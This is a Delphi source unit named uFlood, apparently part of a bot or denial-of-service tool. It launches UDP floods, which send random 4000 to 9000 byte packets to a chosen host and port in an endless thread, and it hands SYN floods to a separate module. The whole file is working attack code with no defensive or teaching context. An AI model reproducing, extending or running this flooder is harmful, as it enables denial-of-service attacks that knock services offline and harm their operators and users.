unit uFlood;

interface

uses
  Windows, uWeb, WinSock, uUtils, uSSYN;

procedure CreateFlood(Host, TypeFlood, Port :String);
procedure StopFlood;

implementation

var
  ThreadID :THandle;
  ThreadH  :THandle;
  DosIp      :String;
  Buf        :String;
  DosPort    :Integer;

function GenerateBuf(Size :Integer) :String;
var
  Buffer  :String;
  I       :Integer;
  P       :Integer;
begin
  Buffer := '';
  for I := 1 to Size do
  begin
    Randomize;
    P := Random(255);
    Buffer := Buffer+char(P);
  end;
  Result := Buffer;
end;

procedure FloodUDP;
var
  Buffer :String;
  wsData :WSAData;
  Host   :String;
  Sock   :TSocket;
  Sin    :SOCKADDR_IN;
  Size   :Integer;
begin
  WSAStartup(MAKEWORD(2,2), wsData);
  Host := DosIp;
  Sock := Socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if Sock = SOCKET_ERROR then
    Exit;
  Sin.sin_family := AF_INET;
  Sin.sin_addr.s_addr := inet_addr(pchar(Host));

  while true do
  begin
    Randomize;
    Sin.sin_port := htons(DosPort);
    Size := Random(5000)+4000;
    Buffer := GenerateBuf(Size);
    SendTo(Sock, Buffer, Size, 0, Sin, SizeOf(Sin));
    Sleep(Random(50));
  end;

  CloseSocket(Sock);
  WSACleanup();
  SuspendThread(ThreadH);
  exit;
end;

procedure CreateFlood(Host, TypeFlood, Port :String);
var
  i :Integer;
begin
  DosIp := Host;
  DosPort := StrToInt(Port);
  if TypeFlood = 'SYN' then
    CreateFloodSSYN(Host, DosPort);
  if TypeFlood = 'UDP' then
      ThreadH := CreateThread(nil, 0, @FloodUDP, nil, 0, ThreadID);

end;

procedure StopFlood;
var
  i :Integer;
begin
  StopFloodSSYN;
  SuspendThread(ThreadH);
end;

end.
